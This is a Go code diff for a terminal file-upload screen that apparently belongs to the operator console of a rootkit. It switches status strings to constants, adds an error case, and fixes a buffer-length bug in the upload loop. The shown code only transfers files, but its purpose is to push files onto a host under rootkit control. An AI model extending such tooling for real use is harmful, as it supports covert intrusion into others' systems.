@@ -2,14 +2,13 @@ package model
 
 import (
 	"bufio"
+	"cli/server"
 	"fmt"
 	"io"
 	"os"
 	"path/filepath"
 	"strings"
 	"time"
-
-	"cli/server"
 
 	"github.com/charmbracelet/bubbles/filepicker"
 	tea "github.com/charmbracelet/bubbletea"
@@ -130,10 +129,12 @@ func (m UploadModel) waitForUploadResultCmd(pth string, file *os.File) tea.Cmd {
 		case msg, ok := <-ch:
 			if ok {
 				switch msg {
-				case "OK\n":
+				case string(OK_BYTES):
 					m.logs.Append("upload started!\n")
 					shouldStartUpload = true
 
+				case string(KO_BYTES):
+					m.logs.Append("upload: couldn't create file\n")
 				default:
 					m.logs.Append(fmt.Sprintf("upload: unexpected response from rootkit: %s\n", msg))
 				}
@@ -163,7 +164,7 @@ func (m UploadModel) readAndSend(file *os.File) error {
 	buf := make([]byte, 1024)
 
 	for {
-		_, err := rd.Read(buf)
+		n, err := rd.Read(buf)
 		if err != nil {
 			// don't log EOF
 			if err != io.EOF {
@@ -172,14 +173,14 @@ func (m UploadModel) readAndSend(file *os.File) error {
 			break
 		}
 
-		_, err = fmt.Fprint(conn, string(buf))
+		_, err = fmt.Fprint(conn, string(buf[:n]))
 		if err != nil {
 			m.logs.Append(fmt.Sprintf("uplaod: error sending file's content to rootkit: %s", err.Error()))
 			return err
 		}
 	}
 
-	_, err := fmt.Fprint(conn, "DONE\n")
+	_, err := fmt.Fprintf(conn, "%s", DONE_BYTES)
 	if err != nil {
 		m.logs.Append(fmt.Sprintf("uplaod: error sending DONE status to rootkit: %s", err.Error()))
 		return err
